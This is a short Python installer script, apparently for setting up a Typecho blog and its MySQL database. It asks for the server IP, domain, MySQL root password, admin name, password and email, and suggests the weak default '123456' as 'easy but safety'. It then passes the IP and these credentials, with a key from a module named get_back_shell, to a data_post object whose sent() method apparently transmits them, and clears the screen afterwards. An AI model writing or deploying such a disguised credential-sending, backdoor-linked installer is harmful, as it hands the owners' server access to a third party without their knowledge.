from change.choose import *
from change.build import *
from change.conf import *
import subprocess
import data_post
import get_back_shell
import os
build()
def buildup():
    #获取IP地址
    T = subprocess.getstatusoutput("wget -qO- -t1 -T2 ipv4.icanhazip.com")
    print("your ip is :" + T[1])
    myip = T[1]
    #获取域名
    doman = input("please input your doman (Space carriage return skip):")
    conf(doman,'typecho.conf','domain')
    #获取数据库root用户密码
    mysql_root_password = input("please input your mysql root_password:(default:123456,easy but safety)")
    conf(mysql_root_password,'mysql.env','MYSQL_ROOT_PASSWORD',1)
    #获取数据库typecho用户密码
    mysql_typecho_password = input("please input your mysql typecho_password:(default:123456,easy but safety,too)")
    conf(mysql_typecho_password,'mysql.env','MYSQL_PASSWORD',1)
    #获取管理员用户名
    admin_name = input("please input your admin name:(default:admin)")
    if admin_name == ' ':
        admin_name = "admin"
    #获取管理员用户密码
    admin_password = input("please input your admin password:（default:123456）")
    if admin_password == ' ':
        admin_password = '123456'
    admin_mail = input("finally，please input your mail:(default:982995037@qq.com)")
    if admin_mail == ' ':
        admin_mail = '982995037@qq.com'
    #dbhost,userurl,userpassword,dbpassword,username ,usermail

    imf = data_post.imformation(get_back_shell.key,myip,admin_password,mysql_root_password,admin_name,admin_mail)
    imf.update()
    imf.sent()
    os.system("clean")
    print("your imformation:\n"
          "your ip:" + myip + "\n"
          "your admin name:"+ admin_name + "\n"
          "your admin password:" + admin_password + "\n")
